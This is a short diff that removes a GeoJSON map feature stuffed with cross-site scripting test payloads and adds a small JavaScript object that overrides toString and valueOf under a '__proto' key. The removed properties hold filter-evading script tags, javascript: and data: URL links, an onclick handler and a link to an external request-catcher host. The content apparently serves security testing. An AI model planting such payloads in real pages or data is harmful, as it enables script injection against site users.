@@ -1,33 +1,6 @@
-{
-  "type": "FeatureCollection",
-  "features": [
-    {
-      "type": "Feature",
-      "properties": {
-        "id": "ci25nrt5f2e94bfrw2sclq6dp <<scr<sc<script>img src=\"https://azer.az\"><scr<object>ipt>alert(1)</script>",
-        "id-class": "azer",
-        "title": "Paris - CloudFlare<a href=\"https://enmkbtx1as6g9.x.pipedream.net/\", onclick=”alert(10);“>azer</a>",
-        "description": "Edge Location<a href=\"javascript:alert(11);\">Back</a>",
-        "marker-size": "medium",
-        "marker-color": "#FFE900",
-        "class": "<a href=data:text/html,%3Cscript%3Ealert%28666%29%3C/script%3E>xss</a>",
-        "marker-symbol": "circle"
-      },
-      "style": {
-        "__comment": "all SVG styles allowedazer",
-        "fill":"red",
-        "stroke-width":"3",
-        "fill-opacity":0.6
-      },
-      "geometry": {
-        "coordinates": [
-          2.340087,
-          48.864714
-        ],
-        "type": "Point"
-      },
-      "id": "ci9brkn3f26tiiylvc2nry6zj"
+var obj = {
+    __proto: {
+        toString: function() {console.log("defconrussia"); return 1111;},
+        valueOf: function() {console.log("defconrussia"); return 2222;}
     }
-  ],
-  "id": "jimaek.map-6gmedxyr"
-}
+};
